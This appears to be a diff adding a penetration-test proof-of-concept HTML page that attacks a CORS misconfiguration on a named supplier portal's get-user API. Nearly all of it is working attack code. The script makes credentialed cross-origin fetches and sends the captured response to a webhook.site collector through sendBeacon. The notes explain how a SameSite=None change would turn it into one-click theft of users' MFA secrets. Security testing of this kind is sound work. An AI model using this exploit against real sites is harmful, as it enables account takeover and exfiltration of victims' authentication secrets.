@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8" />
+<title>CORS exfil PoC — supplier.holmesops.ai /api/auth_v2/get-user</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; max-width: 900px; margin: 40px auto; padding: 0 16px; color: #222; }
+  h2 { margin-top: 0; }
+  pre { background: #111; color: #d4d4d4; padding: 14px 16px; border-radius: 6px; font-size: 12px; line-height: 1.45; white-space: pre-wrap; word-break: break-word; }
+  pre.ok { border-left: 4px solid #4cc38a; }
+  pre.err { border-left: 4px solid #d94c1a; color: #ffb4a2; }
+  code { background: #eee; padding: 1px 4px; border-radius: 3px; }
+  .meta { color: #555; font-size: 13px; }
+</style>
+</head>
+<body>
+
+<h2>CORS exfil PoC</h2>
+<p class="meta">
+  Target: <code>GET https://supplier.holmesops.ai/api/auth_v2/get-user</code><br/>
+  Hosted origin: <code id="origin"></code> (must <strong>not</strong> be <code>https://supplier.holmesops.ai</code>)<br/>
+  Victim must be logged in to <code>supplier.holmesops.ai</code> in the same browser.
+</p>
+
+<h3>1 · Preflight probe</h3>
+<pre id="preflight">running…</pre>
+
+<h3>2 · Credentialed cross-origin GET</h3>
+<pre id="result">running…</pre>
+
+<h3>3 · Exfiltration</h3>
+<pre id="exfil">queued</pre>
+
+<script>
+const TARGET   = "https://supplier.holmesops.ai/api/auth_v2/get-user";
+// Replace with an attacker-controlled collector to capture the leaked profile:
+// e.g. https://webhook.site/<your-uuid>
+const COLLECT  = "https://webhook.site/REPLACE-ME";
+
+document.getElementById("origin").textContent = location.origin;
+
+const $ = (id) => document.getElementById(id);
+
+async function preflight() {
+  // Force a non-simple preflight by adding a custom header. We watch the OPTIONS
+  // response with fetch's `mode: "cors"` — if the browser permits the actual
+  // request we know the preflight was accepted.
+  try {
+    const ctrl = new AbortController();
+    // Use HEAD via fetch with a custom header purely to cause a preflight
+    const r = await fetch(TARGET, {
+      method: "GET",
+      mode: "cors",
+      credentials: "include",
+      headers: { "X-Probe": "1" },
+      signal: ctrl.signal,
+    });
+    return { ok: true, status: r.status, headers: Array.from(r.headers.entries()) };
+  } catch (e) {
+    return { ok: false, error: String(e) };
+  }
+}
+
+async function exfilGet() {
+  // Simple GET — preflight not strictly needed (no custom headers, no
+  // application/json body), so the browser sends the request directly.
+  // The supplier API's actual response carries `Access-Control-Allow-Origin: *`
+  // for simple requests (per pentest finding M005). With `Allow-Credentials: true`
+  // and a wildcard origin, modern browsers refuse to expose the body — so this
+  // path alone does NOT leak. We try it for completeness.
+  try {
+    const r = await fetch(TARGET, {
+      method: "GET",
+      mode: "cors",
+      credentials: "include",
+      headers: { "Accept": "application/json" },
+    });
+    const body = await r.text();
+    return { ok: true, status: r.status, length: body.length, body };
+  } catch (e) {
+    return { ok: false, error: String(e) };
+  }
+}
+
+async function send(out) {
+  if (!COLLECT || COLLECT.includes("REPLACE-ME")) {
+    return "skipped (set COLLECT to your webhook URL)";
+  }
+  try {
+    // sendBeacon is fire-and-forget and avoids the response-read CORS hurdle.
+    const blob = new Blob([JSON.stringify(out)], { type: "application/json" });
+    const ok = navigator.sendBeacon(COLLECT, blob);
+    return ok ? "sendBeacon dispatched to " + COLLECT
+              : "sendBeacon refused";
+  } catch (e) {
+    return "exfil failed: " + e.message;
+  }
+}
+
+(async () => {
+  const pf = await preflight();
+  $("preflight").textContent = JSON.stringify(pf, null, 2);
+  $("preflight").className = pf.ok ? "ok" : "err";
+
+  const res = await exfilGet();
+  $("result").textContent = JSON.stringify(res, null, 2);
+  $("result").className = res.ok ? "ok" : "err";
+
+  $("exfil").textContent = await send({ preflight: pf, result: res });
+})();
+</script>
+
+<h3>Notes</h3>
+<ul>
+  <li><strong>Same-origin lab test.</strong> Open this file via <code>file://</code> or any non-<code>supplier.holmesops.ai</code> origin (e.g. <code>http://localhost:8000/cors_get_user.html</code> or a public host). It must <em>not</em> be served from the supplier portal itself, or the request is same-origin and the test is meaningless.</li>
+  <li><strong>SameSite caveat.</strong> The supplier portal sets the <code>access_token</code> cookie with <code>SameSite=Lax</code>. Modern browsers therefore drop cookies on this cross-site fetch, and the request will be authenticated as anonymous (HTTP 401). If that happens, the credentialed-CORS path is mitigated by SameSite — but the underlying CORS misconfiguration (preflight reflection + <code>*</code> on actual response with credentials) still stands as a finding because (a) any future drift to <code>SameSite=None</code> immediately turns this PoC into account-takeover, and (b) it allows blind state-changing CSRF on routes that bypass SameSite (top-level navigations).</li>
+  <li><strong>If <code>SameSite=None</code> is ever set</strong> on <code>access_token</code>, this PoC will read the response body — which includes <code>app_metadata.mfa_secret</code> and <code>mfa_otpauth_url</code>. The bug then escalates to remote MFA-secret exfiltration with one click, no malware required.</li>
+  <li>Replace <code>COLLECT</code> with your own webhook (RequestBin, webhook.site, Burp Collaborator) to demonstrate end-to-end exfiltration.</li>
+</ul>
+
+</body>
+</html>
